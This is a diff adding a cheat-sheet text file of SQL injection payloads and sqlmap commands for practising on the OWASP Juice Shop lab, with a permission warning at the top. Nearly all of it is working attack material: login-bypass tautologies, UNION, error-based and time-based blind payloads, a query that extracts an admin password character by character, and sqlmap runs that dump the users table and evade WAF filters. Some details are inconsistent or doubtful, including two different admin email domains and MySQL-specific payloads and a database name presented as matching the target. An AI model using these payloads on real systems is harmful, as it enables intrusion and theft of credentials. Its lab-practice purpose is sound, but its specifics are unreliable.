@@ -1,0 +1,49 @@
+# SQLInjectioncommands.txt
+# Purpose: common SQL injection test payloads and example sqlmap usage for OWASP Juice Shop (lab only).
+# WARNING: Use only on systems you own or have explicit permission to test.
+
+-- Basic authentication bypass / tautology payloads (use in login & search fields)
+' OR '1'='1
+' OR 1=1--
+' OR '1'='1' --
+' OR 'a'='a
+' OR '1'='1' LIMIT 1; --
+' OR '1'='1' /*
+
+-- Classic union-based enumeration (adapt columns)
+' UNION SELECT NULL--
+' UNION SELECT 1,2,3,4--
+' UNION ALL SELECT NULL,NULL,NULL,NULL--
+
+-- Error-based payloads (force DB error to reveal info)
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+
+-- Time-based (blind) payloads (MySQL sleeps) – use cautiously
+' OR IF(1=1, SLEEP(5), 0)--
+' OR IF((SELECT COUNT(*) FROM users WHERE email='admin@juice-sh.op')>0, SLEEP(3), 0)--
+
+-- Extract specific column via boolean blind (example)
+' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE email='admin@juice-shop.com') > 64 --
+
+-- Example sqlmap usage (save a Burp request to request.txt first)
+# 1) Basic discovery (passive)
+sqlmap -r request.txt --batch --level=1 --risk=1
+
+# 2) Enumerate DBMS and DB names
+sqlmap -r request.txt -p email --batch --dbs --threads=4
+
+# 3) Dump a target table (users)
+sqlmap -r request.txt -p email --batch -D juice_shop_db -T users --dump
+
+# 4) Use tamper scripts if WAF/filters present
+sqlmap -r request.txt -p search --tamper=between,randomcase --batch
+
+# Tips:
+# - Replace parameter names and request file as needed.
+# - Use --technique=BEUST to constrain techniques (B=Boolean, E=Error, U=Union, S=Stacked, T=Time).
+# - Avoid destructive flags (--os-shell, --os-pwn) unless authorised.
+# - Review and redact sensitive outputs before sharing.
+
+# Notes specific to Juice Shop:
+# - Juice Shop is intentionally vulnerable; several endpoints (e.g. /rest/user/login, /rest/products/search) are good candidates.
+# - Start with non-destructive checks (error strings, boolean tests) before using time-based techniques.
